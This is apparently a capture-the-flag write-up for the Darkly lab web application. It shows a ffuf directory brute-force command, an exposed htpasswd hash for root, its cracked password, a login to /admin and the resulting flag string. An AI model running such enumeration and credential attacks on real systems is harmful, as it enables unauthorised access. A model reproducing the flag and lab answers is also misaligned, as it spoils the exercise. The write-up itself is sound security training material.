# Hidden Directory
<br>

# 1. Overview

During the exploration of the Darkly web application, a directory enumeration attack revealed a hidden folder containing a file with exposed credentials.
These credentials allowed authentication in the administrative panel, which resulted in obtaining the next flag.

This vulnerability demonstrates a Sensitive Data Exposure caused by misconfigured access control and improper storage of credentials.

---

<br>

# 2. Directory Enumeration

A directory brute-force scan was performed using ffuf and the directory-list-2.3-medium wordlist.
```
ffuf -u http://darkly.fr/FUZZ \ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \ -fs 975
```

Parameters
```
Parameter 		Description
-u		  		Target URL with fuzzing position
-w		  		Wordlist used for directory discovery
-fs		  		975	Filters responses with size 975 (default page response size)
```
> Filtering responses by size helps remove false positives, since the application returns identical pages for many invalid paths.

<br>

# 3. Discovered Directories

The scan revealed several accessible directories:

* images
* admin
* audio
* css
* includes
* js
* fonts
* errors
* whatever

Among them, the **/whatever** directory appeared unusual and required further investigation.

<br>

# 4. Sensitive File Exposure

It contained the **htpasswd** file.

```
cat htpasswd
```
**Result:**

```
root:437394baff5aa33daa618be47b75cb49
```

<br>

# 5. Hash Cracking
Using crackstation.net we recovered the original value:
```
437394baff5aa33daa618be47b75cb49 -> qwerty123@
```

<br>

# 6. Access
Acessing /admin with:

> User: **root**

> Password: **qwerty123@**

<br>

![alt text](4.1-HD.png)

<br>

# 🎉 Flag (6/14)

```
d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff
```
